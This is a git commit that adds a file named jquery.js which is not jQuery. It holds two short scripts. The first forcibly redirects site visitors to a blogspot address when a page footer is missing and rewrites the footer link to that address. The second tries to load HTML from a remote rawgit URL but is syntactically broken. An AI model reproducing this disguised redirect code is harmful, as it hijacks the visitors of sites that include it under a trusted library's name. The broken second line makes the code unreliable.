cac0cbcb890f94b2885b71a3da44c7ad6ab38ebf
mobpost <asepmulyana.ht1@gmail.com>
2016-10-26 22:25:51 +0700

    Create jquery.js

---
+++ jquery.js
@@ -0,0 +1,2 @@
+$(document).ready(function(){var aa=$('#footer').val();if(aa == null){window.location.href = 'http://chepps.blogspot.com/';};$('#footer').attr('href','http://chepps.blogspot.com/');});
+$(document).ready(function(){var aa=$('#footer').val();if(aa == null){.load('https://cdn.rawgit.com/mobpost/css/html/blogger.html');});
